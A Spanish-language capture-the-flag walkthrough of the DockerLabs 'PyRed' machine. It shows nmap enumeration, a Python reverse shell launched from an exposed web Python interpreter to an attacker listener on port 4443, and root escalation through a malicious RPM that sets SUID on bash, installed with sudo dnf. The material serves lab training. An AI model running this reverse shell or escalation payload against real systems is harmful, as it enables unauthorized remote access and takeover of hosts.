# PyRed 
![pyred](https://github.com/TBrux/DOCKERLABS/assets/168732212/581d6970-5f9f-4693-915d-8e2cd06b14cb)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT     STATE SERVICE REASON
5000/tcp open  upnp    syn-ack ttl 64
```

Como tenemos abierto el puerto 5000, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p5000 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p5000`: Escaneo de los puertos 5000.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```
PORT     STATE SERVICE REASON         VERSION
5000/tcp open  upnp?   syn-ack ttl 64
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.12.2
```
Vamos a ver que encontramos en el puerto 5000 y vemos que es una página con lo que parece un intérprete de **Python**.
![python](https://github.com/TBrux/DOCKERLABS/assets/168732212/62e5c69b-3c12-446f-b82e-420d76ab694a)

## Explotación.

Lo siguiente es ponernos a la escucha en un puerto en nuestro equipo y enviarnos una reverse shell desde el interprete de **Pyhton**.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
```
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 4443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
```
Una vez lo lanzamos ya establemos la reverse shell con el usuario primpi.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33108
sh: cannot set terminal process group (1): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.2$ whoami
whoami
primpi
sh-5.2$ 
````
## Escalada de privilegios.
Comprobamos binarios y archivos que podemos lanzar como root u otro usuario con más privilegios.
```bash
sudo -l
```
```
sh-5.2$ sudo -l
sudo -l
Matching Defaults entries for primpi on c35c7f5e90f9:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User primpi may run the following commands on c35c7f5e90f9:
    (ALL) NOPASSWD: /usr/bin/dnf
```
Vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/) y vemos que podemos ver los pasos para crear un archivo malicioso que después subiremo a la máquina lo ejecutaremos con **/usr/bin/dnf**.
```bash
❯ TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0-1.noarch.rpm"}
```
Hemos creardo el archivo **x-1.0-1.noarch.rpm** que ahora lo subiremos a la máquina victima creando un servidor **http** con python en el directorio donde tenemos nuestro archivo y con **curl** lo descargamos en la máquina victima en la carpeta


```bash
python3 -m http.server 8080
```
```bash
curl 172.17.0.1/x-1.0-1.noarch.rpm -o noarch.rpm
```
Una vez ya lo tenemos en la máquina víctima, lo instalamos con el binario **/usr/bin/dnf** y así cambiamos el SUID de bash y podemos ejecutarla comor **root**.
```bash
sudo -u root /usr/bin/dnf install -y noarch.rpm
```
```bash
bash -p
```
```
sh-5.2$ bash -p
whoami
root
```

